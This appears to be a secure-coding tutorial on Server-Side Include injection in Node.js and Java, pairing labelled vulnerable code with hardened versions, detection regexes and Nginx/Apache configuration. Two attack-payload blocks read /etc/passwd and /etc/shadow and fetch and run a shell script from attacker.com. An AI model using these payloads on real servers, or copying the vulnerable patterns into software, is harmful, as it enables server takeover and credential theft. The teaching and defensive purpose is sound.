Including user input directly in server-side templates without proper sanitization is extremely dangerous and can lead to Server-Side Include (SSI) injection or Server-Side Template Injection (SSTI). This vulnerability allows attackers to execute arbitrary commands on your server.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

// Dangerous: SSI-enabled template processing with user input
app.get('/welcome', (req, res) => {
  const username = req.query.name;

  // Directly embedding user input into SSI-enabled template
  let template = fs.readFileSync('./templates/welcome.shtml', 'utf8');

  // Simple string replacement - DANGEROUS!
  template = template.replace('{{USERNAME}}', username);

  // Serving .shtml file that Apache/nginx might process for SSI
  res.setHeader('Content-Type', 'text/html');
  res.send(template);
});

// Even worse: Dynamic template generation with user input
app.get('/page', (req, res) => {
  const content = req.query.content;

  // User controls the entire content - SSI injection possible
  const html = `
    <!DOCTYPE html>
    <html>
    <body>
      <div>${content}</div>
    </body>
    </html>
  `;

  res.send(html);
});

app.listen(3000);
```

**Attack Payload**:
```text
<!--#exec cmd="cat /etc/passwd"-->
<!--#include virtual="/etc/shadow"-->
<!--#echo var="DOCUMENT_ROOT"-->
<!--#exec cmd="wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh"-->
```

**Why This Is Dangerous**:
- SSI directives in user input get processed by the web server, executing arbitrary commands
- Attackers can read sensitive files like `/etc/passwd` or application configuration
- Remote code execution allows complete server takeover
- No input validation means any SSI directive passes through
- Even with Node.js, if behind Apache/nginx with SSI enabled, the vulnerability persists

**SECURE VERSION**:

```javascript
const express = require('express');
const escape = require('escape-html');
const nunjucks = require('nunjucks');
const helmet = require('helmet');

const app = express();

// Use helmet for security headers
app.use(helmet());

// Configure nunjucks with autoescape enabled
const env = nunjucks.configure('templates', {
  autoescape: true,  // CRITICAL: Auto-escape all output
  noCache: process.env.NODE_ENV !== 'production',
  express: app
});

// Input validation middleware
const validateInput = (allowedPattern) => {
  return (req, res, next) => {
    const input = req.query.name || req.body.name || '';

    // Whitelist validation - only allow safe characters
    if (!allowedPattern.test(input)) {
      return res.status(400).json({ error: 'Invalid input characters' });
    }

    // Length limit
    if (input.length > 100) {
      return res.status(400).json({ error: 'Input too long' });
    }

    req.sanitizedName = escape(input);
    next();
  };
};

// Safe: Using template engine with auto-escaping
app.get('/welcome', 
  validateInput(/^[a-zA-Z0-9\s-]+$/),
  (req, res) => {
    // Template engine handles escaping automatically
    res.render('welcome.html', {
      username: req.sanitizedName
    });
  }
);

// Explicit sanitization for dynamic content
app.get('/page', (req, res) => {
  const rawContent = req.query.content || '';

  // Strip any SSI-like directives
  const sanitized = rawContent
    .replace(/<!--#[^>]*-->/gi, '')  // Remove SSI directives
    .replace(/<script[^>]*>.*?<\/script>/gi, '')  // Remove scripts
    .replace(/<[^>]+>/g, '');  // Remove all HTML tags

  // Double-escape for safety
  const safeContent = escape(sanitized);

  res.render('page.html', { content: safeContent });
});

app.listen(3000);
```

**Key Security Controls**:
- **Auto-escaping templates**: Nunjucks with `autoescape: true` escapes all variables by default, neutralizing SSI directives
- **Input validation**: Whitelist approach only allows alphanumeric characters, blocking SSI syntax
- **Explicit sanitization**: Strip SSI directive patterns before processing
- **Security headers**: Helmet adds X-Content-Type-Options, preventing MIME-type sniffing

When your Node.js app sits behind Apache/Nginx and you need to allow limited HTML formatting, you need a defense-in-depth approach that addresses both the reverse proxy configuration and application-level sanitization.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const DOMPurify = require('isomorphic-dompurify');
const nunjucks = require('nunjucks');
const winston = require('winston');
const { v4: uuidv4 } = require('uuid');

const app = express();

// Production logger with security context
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'security.log' })
  ]
});

// Security headers - disable SSI processing hints
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
    }
  },
  xContentTypeOptions: true,  // Prevents MIME sniffing
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'Too many requests'
});
app.use(limiter);

// DOMPurify configuration for safe HTML
const SAFE_HTML_CONFIG = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li', 'a'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false,
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
  // CRITICAL: Block SSI patterns
  CUSTOM_ELEMENT_HANDLING: {
    tagNameCheck: null,
    attributeNameCheck: null,
    allowCustomizedBuiltInElements: false
  }
};

// SSI pattern detection
const SSI_PATTERNS = [
  /<!--#/gi,
  /<!--\s*#/gi,
  /<%.*%>/gi,
  /\$\{.*\}/gi,
  /\{\{.*\}\}/gi,
  /<\?.*\?>/gi
];

function containsSSIPatterns(input) {
  return SSI_PATTERNS.some(pattern => pattern.test(input));
}

// Comprehensive sanitization middleware
const sanitizeHtmlInput = (req, res, next) => {
  const requestId = uuidv4();
  req.requestId = requestId;

  const rawContent = req.body.content || req.query.content || '';

  // Layer 1: Check for SSI patterns BEFORE any processing
  if (containsSSIPatterns(rawContent)) {
    logger.warn({
      event: 'ssi_injection_attempt',
      requestId,
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      payload: rawContent.substring(0, 500)
    });
    return res.status(400).json({ 
      error: 'Invalid content detected',
      requestId 
    });
  }

  // Layer 2: Length validation
  if (rawContent.length > 10000) {
    logger.warn({
      event: 'content_length_exceeded',
      requestId,
      length: rawContent.length
    });
    return res.status(400).json({ error: 'Content too long' });
  }

  // Layer 3: DOMPurify sanitization
  const sanitized = DOMPurify.sanitize(rawContent, SAFE_HTML_CONFIG);

  // Layer 4: Post-sanitization SSI check (defense in depth)
  if (containsSSIPatterns(sanitized)) {
    logger.error({
      event: 'ssi_bypass_attempt',
      requestId,
      ip: req.ip
    });
    return res.status(400).json({ error: 'Invalid content' });
  }

  req.sanitizedContent = sanitized;

  logger.info({
    event: 'content_sanitized',
    requestId,
    originalLength: rawContent.length,
    sanitizedLength: sanitized.length
  });

  next();
};

// Configure template engine
const env = nunjucks.configure('templates', {
  autoescape: true,
  express: app,
  noCache: process.env.NODE_ENV !== 'production'
});

// Add custom filter for pre-sanitized HTML
env.addFilter('safe_html', function(content) {
  // Only mark as safe if already sanitized by middleware
  return new nunjucks.runtime.SafeString(content);
});

app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ extended: true, limit: '10kb' }));

// Production endpoint with full sanitization
app.post('/api/content', sanitizeHtmlInput, (req, res) => {
  try {
    const html = nunjucks.render('content.html', {
      userContent: req.sanitizedContent,
      requestId: req.requestId
    });

    // Set headers to prevent SSI processing by reverse proxy
    res.setHeader('X-SSI-Processing', 'disabled');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);

  } catch (error) {
    logger.error({
      event: 'render_error',
      requestId: req.requestId,
      error: error.message
    });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Health check for monitoring
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  logger.info({ event: 'server_started', port: PORT });
});
```

**Nginx Configuration (Disable SSI)**:
```nginx
server {
    listen 80;
    server_name example.com;

    # CRITICAL: Disable SSI processing
    ssi off;

    location / {
        proxy_pass http://localhost:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        # Prevent SSI in proxied responses
        proxy_set_header Accept-Encoding "";
    }

    # Block direct access to .shtml files
    location ~* \.shtml$ {
        deny all;
        return 404;
    }
}
```

**Apache Configuration (Disable SSI)**:
```apache
<VirtualHost *:80>
    ServerName example.com

    # Disable SSI globally
    Options -Includes -IncludesNOEXEC

    # Remove SSI handler
    RemoveHandler .shtml
    RemoveType .shtml

    ProxyPass / http://localhost:3000/
    ProxyPassReverse / http://localhost:3000/

    # Block SSI file extensions
    <FilesMatch "\.(shtml|stm|shtm)$">
        Require all denied
    </FilesMatch>
</VirtualHost>
```

**Defense in Depth Layers**:
1. **Reverse proxy level**: Disable SSI processing entirely in Nginx/Apache configuration
2. **Pre-processing detection**: Check for SSI patterns before any content processing
3. **Content sanitization**: DOMPurify with strict allowlist removes dangerous tags/attributes
4. **Post-processing verification**: Double-check sanitized content for SSI bypass attempts
5. **Template auto-escaping**: Nunjucks escapes any residual dangerous characters

**Additional Protections**:
- **Request logging**: All suspicious requests logged with full context for forensic analysis
- **Rate limiting**: Prevents automated SSI injection scanning
- **Content-Type headers**: Explicit UTF-8 charset prevents encoding-based attacks
- **Request size limits**: Prevents large payload attacks
- **File extension blocking**: .shtml and similar files blocked at reverse proxy
- **Monitoring alerts**: Set up alerts for `ssi_injection_attempt` log events

Server-Side Includes (SSI) are a legacy feature that can introduce severe security vulnerabilities if misconfigured. Many applications enable SSI without understanding the risks, particularly when user input can influence SSI-processed content.

**VULNERABLE CODE**:

```java
// web.xml - DANGEROUS SSI configuration
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <!-- DANGEROUS: SSI servlet enabled with exec command support -->
    <servlet>
        <servlet-name>ssi</servlet-name>
        <servlet-class>org.apache.catalina.ssi.SSIServlet</servlet-class>
        <init-param>
            <param-name>buffered</param-name>
            <param-value>1</param-value>
        </init-param>
        <init-param>
            <param-name>debug</param-name>
            <param-value>1</param-value> <!-- Debug enabled in production -->
        </init-param>
        <init-param>
            <param-name>expires</param-name>
            <param-value>666</param-value>
        </init-param>
        <init-param>
            <param-name>isVirtualWebappRelative</param-name>
            <param-value>false</param-value> <!-- Allows absolute paths -->
        </init-param>
        <init-param>
            <param-name>allowExec</param-name>
            <param-value>true</param-value> <!-- CRITICAL: Allows command execution -->
        </init-param>
        <load-on-startup>4</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>ssi</servlet-name>
        <url-pattern>*.shtml</url-pattern>
    </servlet-mapping>

    <servlet-mapping>
        <servlet-name>ssi</servlet-name>
        <url-pattern>*.html</url-pattern> <!-- All HTML processed as SSI -->
    </servlet-mapping>
</web-app>
```

```java
// VulnerablePageController.java - User input flows into SSI content
import javax.servlet.http.*;
import java.io.*;

public class VulnerablePageController extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws IOException {

        String username = request.getParameter("user");
        String template = request.getParameter("template");

        // VULNERABLE: User input directly written to SSI-processed file
        String pageContent = "<html><body>" +
            "<h1>Welcome, " + username + "</h1>" +
            "<!--#include virtual=\"" + template + "\" -->" +
            "</body></html>";

        // Writing to a .shtml file that will be processed by SSI
        File outputFile = new File("/var/www/pages/user_" + 
            System.currentTimeMillis() + ".shtml");
        try (FileWriter writer = new FileWriter(outputFile)) {
            writer.write(pageContent);
        }

        response.sendRedirect("/pages/" + outputFile.getName());
    }
}
```

**Attack Payload**:
```text
# SSI Command Execution (when allowExec=true)
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh" -->

# SSI File Inclusion
<!--#include virtual="/etc/passwd" -->
<!--#include virtual="/WEB-INF/web.xml" -->
<!--#include virtual="../../../etc/shadow" -->

# SSI Environment Variable Disclosure
<!--#echo var="DOCUMENT_ROOT" -->
<!--#echo var="SERVER_SOFTWARE" -->
<!--#printenv -->
```

**Why This Is Dangerous**:
- `allowExec=true` permits arbitrary command execution through SSI `#exec` directives
- `isVirtualWebappRelative=false` allows path traversal to access files outside the web root
- User-controlled input flows directly into SSI-processed content without sanitization
- Debug mode enabled in production leaks sensitive configuration information
- Mapping SSI to all `.html` files expands the attack surface unnecessarily

**SECURE VERSION**:

```java
// web.xml - Secure SSI configuration (or preferably disabled entirely)
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <!-- 
         SECURITY BEST PRACTICE: Do not enable SSI at all.
         Use modern templating engines (Thymeleaf, FreeMarker, JSP) instead.

         If SSI is absolutely required for legacy compatibility:
    -->
    <servlet>
        <servlet-name>ssi</servlet-name>
        <servlet-class>org.apache.catalina.ssi.SSIServlet</servlet-class>
        <init-param>
            <param-name>buffered</param-name>
            <param-value>1</param-value>
        </init-param>
        <init-param>
            <param-name>debug</param-name>
            <param-value>0</param-value> <!-- Debug disabled -->
        </init-param>
        <init-param>
            <param-name>expires</param-name>
            <param-value>0</param-value> <!-- No caching of dynamic content -->
        </init-param>
        <init-param>
            <param-name>isVirtualWebappRelative</param-name>
            <param-value>true</param-value> <!-- Restrict to webapp context -->
        </init-param>
        <init-param>
            <param-name>allowExec</param-name>
            <param-value>false</param-value> <!-- CRITICAL: Disable exec -->
        </init-param>
        <load-on-startup>4</load-on-startup>
    </servlet>

    <!-- Restrict SSI to specific directory only -->
    <servlet-mapping>
        <servlet-name>ssi</servlet-name>
        <url-pattern>/ssi-content/*.shtml</url-pattern>
    </servlet-mapping>

    <!-- Security constraint to limit SSI content access -->
    <security-constraint>
        <web-resource-collection>
            <web-resource-name>SSI Content</web-resource-name>
            <url-pattern>/ssi-content/*</url-pattern>
        </web-resource-collection>
        <auth-constraint>
            <role-name>ssi-viewer</role-name>
        </auth-constraint>
    </security-constraint>
</web-app>
```

```java
// SecurePageController.java - Modern templating without SSI
import javax.servlet.http.*;
import java.io.*;
import java.util.regex.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecurePageController extends HttpServlet {

    private static final Logger logger = LoggerFactory.getLogger(SecurePageController.class);
    private static final Pattern SSI_PATTERN = Pattern.compile(
        "<!--\\s*#(include|exec|echo|config|fsize|flastmod|printenv).*?-->",
        Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
    private static final Pattern SAFE_USERNAME = Pattern.compile("^[a-zA-Z0-9_-]{1,50}$");

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws IOException {

        String username = request.getParameter("user");

        // INPUT VALIDATION: Strict allowlist for username
        if (username == null || !SAFE_USERNAME.matcher(username).matches()) {
            logger.warn("Invalid username attempted: {} from IP: {}", 
                sanitizeForLog(username), request.getRemoteAddr());
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid username");
            return;
        }

        // DEFENSE IN DEPTH: Check for SSI injection attempts
        if (containsSSIDirectives(username)) {
            logger.error("SSI injection attempt detected from IP: {}", 
                request.getRemoteAddr());
            response.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid input detected");
            return;
        }

        // Use HTML encoding for output
        String safeUsername = encodeHtml(username);

        response.setContentType("text/html;charset=UTF-8");
        response.setHeader("X-Content-Type-Options", "nosniff");
        response.setHeader("Content-Security-Policy", "default-src 'self'");

        try (PrintWriter out = response.getWriter()) {
            out.println("<html><body>");
            out.println("<h1>Welcome, " + safeUsername + "</h1>");
            out.println("</body></html>");
        }
    }

    private boolean containsSSIDirectives(String input) {
        if (input == null) return false;
        return SSI_PATTERN.matcher(input).find();
    }

    private String encodeHtml(String input) {
        if (input == null) return "";
        return input.replace("&", "&amp;")
                    .replace("<", "&lt;")
                    .replace(">", "&gt;")
                    .replace("\"", "&quot;")
                    .replace("'", "&#x27;");
    }

    private String sanitizeForLog(String input) {
        if (input == null) return "null";
        return input.replaceAll("[\\r\\n]", "_").substring(0, Math.min(input.length(), 100));
    }
}
```

**Key Security Controls**:
- **Disable SSI entirely**: Modern applications should use proper templating engines (Thymeleaf, FreeMarker) instead of SSI
- **allowExec=false**: Never allow command execution through SSI directives
- **isVirtualWebappRelative=true**: Restricts file inclusion to the webapp context only
- **Input validation**: Strict allowlist patterns reject SSI injection attempts before processing
- **Defense in depth**: Multiple layers including HTML encoding and SSI pattern detection

When SSI is absolutely required for legacy compatibility, you need multiple layers of protection including WAF rules, content filtering, strict file permissions, and comprehensive monitoring.

**PRODUCTION PATTERN**:

```java
// SecureSSIFilter.java - Servlet filter to protect SSI processing
package com.example.security.filters;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.WebFilter;
import java.io.*;
import java.util.regex.*;
import java.util.*;
import java.time.Instant;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import io.micrometer.core.instrument.Counter;
import io.micrometer.core.instrument.MeterRegistry;

@WebFilter(urlPatterns = {"/ssi-content/*", "*.shtml"})
public class SecureSSIFilter implements Filter {

    private static final Logger logger = LoggerFactory.getLogger(SecureSSIFilter.class);
    private static final Logger securityAudit = LoggerFactory.getLogger("SECURITY_AUDIT");

    // SSI directive patterns for detection
    private static final Pattern SSI_EXEC_PATTERN = Pattern.compile(
        "<!--\\s*#exec\\s+", Pattern.CASE_INSENSITIVE);
    private static final Pattern SSI_INCLUDE_PATTERN = Pattern.compile(
        "<!--\\s*#include\\s+(virtual|file)\\s*=\\s*[\"']([^\"']+)[\"']", 
        Pattern.CASE_INSENSITIVE);
    private static final Pattern PATH_TRAVERSAL_PATTERN = Pattern.compile(
        "(\\.\\./|\\.\\.\\\\|%2e%2e%2f|%2e%2e/|\\.\\.%2f|%2e%2e%5c)", 
        Pattern.CASE_INSENSITIVE);

    // Allowed include paths (whitelist)
    private static final Set<String> ALLOWED_INCLUDE_PATHS = new HashSet<>(Arrays.asList(
        "/ssi-content/headers/",
        "/ssi-content/footers/",
        "/ssi-content/common/"
    ));

    private Counter ssiBlockedCounter;
    private Counter ssiAllowedCounter;
    private boolean enabled = true;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        String enabledParam = filterConfig.getInitParameter("enabled");
        this.enabled = enabledParam == null || Boolean.parseBoolean(enabledParam);

        // Initialize metrics (assuming Spring Boot with Micrometer)
        try {
            ServletContext ctx = filterConfig.getServletContext();
            MeterRegistry registry = (MeterRegistry) ctx.getAttribute("meterRegistry");
            if (registry != null) {
                ssiBlockedCounter = Counter.builder("security.ssi.blocked")
                    .description("SSI requests blocked by security filter")
                    .register(registry);
                ssiAllowedCounter = Counter.builder("security.ssi.allowed")
                    .description("SSI requests allowed through filter")
                    .register(registry);
            }
        } catch (Exception e) {
            logger.warn("Could not initialize metrics: {}", e.getMessage());
        }

        logger.info("SecureSSIFilter initialized, enabled={}", enabled);
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {

        if (!enabled) {
            chain.doFilter(request, response);
            return;
        }

        HttpServletRequest httpRequest = (HttpServletRequest) request;
        HttpServletResponse httpResponse = (HttpServletResponse) response;

        String requestId = UUID.randomUUID().toString();
        String clientIP = getClientIP(httpRequest);
        String requestURI = httpRequest.getRequestURI();

        // LAYER 1: Check for path traversal in URL
        if (containsPathTraversal(requestURI)) {
            logSecurityEvent(requestId, clientIP, "PATH_TRAVERSAL", requestURI);
            incrementBlocked();
            httpResponse.sendError(HttpServletResponse.SC_FORBIDDEN, "Access denied");
            return;
        }

        // LAYER 2: Check query parameters for SSI injection
        if (checkParametersForSSI(httpRequest, requestId, clientIP)) {
            incrementBlocked();
            httpResponse.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid input");
            return;
        }

        // LAYER 3: Wrap response to filter SSI content
        SSIContentFilterWrapper responseWrapper = new SSIContentFilterWrapper(httpResponse);

        try {
            chain.doFilter(request, responseWrapper);

            // LAYER 4: Validate SSI content before sending to client
            String content = responseWrapper.getCapturedContent();
            if (content != null) {
                ValidationResult result = validateSSIContent(content);

                if (!result.isValid()) {
                    logSecurityEvent(requestId, clientIP, "SSI_CONTENT_VIOLATION", 
                        result.getViolation());
                    incrementBlocked();
                    httpResponse.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
                    return;
                }

                // Content is safe, write to actual response
                response.setContentType(responseWrapper.getContentType());
                response.getWriter().write(content);
            }

            incrementAllowed();

        } catch (Exception e) {
            logger.error("Error processing SSI request: {}", e.getMessage());
            httpResponse.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
        }
    }

    private boolean checkParametersForSSI(HttpServletRequest request, 
                                          String requestId, String clientIP) {
        Enumeration<String> paramNames = request.getParameterNames();

        while (paramNames.hasMoreElements()) {
            String paramName = paramNames.nextElement();
            String[] values = request.getParameterValues(paramName);

            for (String value : values) {
                if (SSI_EXEC_PATTERN.matcher(value).find()) {
                    logSecurityEvent(requestId, clientIP, "SSI_EXEC_INJECTION", 
                        "param=" + paramName);
                    return true;
                }

                Matcher includeMatcher = SSI_INCLUDE_PATTERN.matcher(value);
                if (includeMatcher.find()) {
                    String includePath = includeMatcher.group(2);
                    if (!isAllowedIncludePath(includePath)) {
                        logSecurityEvent(requestId, clientIP, "SSI_INCLUDE_INJECTION", 
                            "param=" + paramName + ", path=" + includePath);
                        return true;
                    }
                }

                if (containsPathTraversal(value)) {
                    logSecurityEvent(requestId, clientIP, "PATH_TRAVERSAL_PARAM", 
                        "param=" + paramName);
                    return true;
                }
            }
        }
        return false;
    }

    private ValidationResult validateSSIContent(String content) {
        // Check for exec directives (should never be in output)
        if (SSI_EXEC_PATTERN.matcher(content).find()) {
            return new ValidationResult(false, "Exec directive found in content");
        }

        // Validate all include paths
        Matcher includeMatcher = SSI_INCLUDE_PATTERN.matcher(content);
        while (includeMatcher.find()) {
            String includePath = includeMatcher.group(2);
            if (!isAllowedIncludePath(includePath)) {
                return new ValidationResult(false, 
                    "Unauthorized include path: " + includePath);
            }
        }

        return new ValidationResult(true, null);
    }

    private boolean isAllowedIncludePath(String path) {
        if (path == null) return false;
        String normalizedPath = path.toLowerCase().trim();

        // Reject path traversal
        if (containsPathTraversal(normalizedPath)) return false;

        // Check against whitelist
        for (String allowed : ALLOWED_INCLUDE_PATHS) {
            if (normalizedPath.startsWith(allowed)) {
                return true;
            }
        }
        return false;
    }

    private boolean containsPathTraversal(String input) {
        if (input == null) return false;
        return PATH_TRAVERSAL_PATTERN.matcher(input).find();
    }

    private String getClientIP(HttpServletRequest request) {
        String xForwardedFor = request.getHeader("X-Forwarded-For");
        if (xForwardedFor != null && !xForwardedFor.isEmpty()) {
            return xForwardedFor.split(",")[0].trim();
        }
        return request.getRemoteAddr();
    }

    private void logSecurityEvent(String requestId, String clientIP, 
                                  String eventType, String details) {
        securityAudit.warn("SSI_SECURITY_EVENT | request_id={} | client_ip={} | " +
            "event_type={} | details={} | timestamp={}",
            requestId, clientIP, eventType, 
            sanitizeLogInput(details), Instant.now().toString());
    }

    private String sanitizeLogInput(String input) {
        if (input == null) return "null";
        return input.replaceAll("[\\r\\n\\t]", "_")
                    .substring(0, Math.min(input.length(), 200));
    }

    private void incrementBlocked() {
        if (ssiBlockedCounter != null) ssiBlockedCounter.increment();
    }

    private void incrementAllowed() {
        if (ssiAllowedCounter != null) ssiAllowedCounter.increment();
    }

    @Override
    public void destroy() {
        logger.info("SecureSSIFilter destroyed");
    }

    // Inner class for validation results
    private static class ValidationResult {
        private final boolean valid;
        private final String violation;

        ValidationResult(boolean valid, String violation) {
            this.valid = valid;
            this.violation = violation;
        }

        boolean isValid() { return valid; }
        String getViolation() { return violation; }
    }
}
```

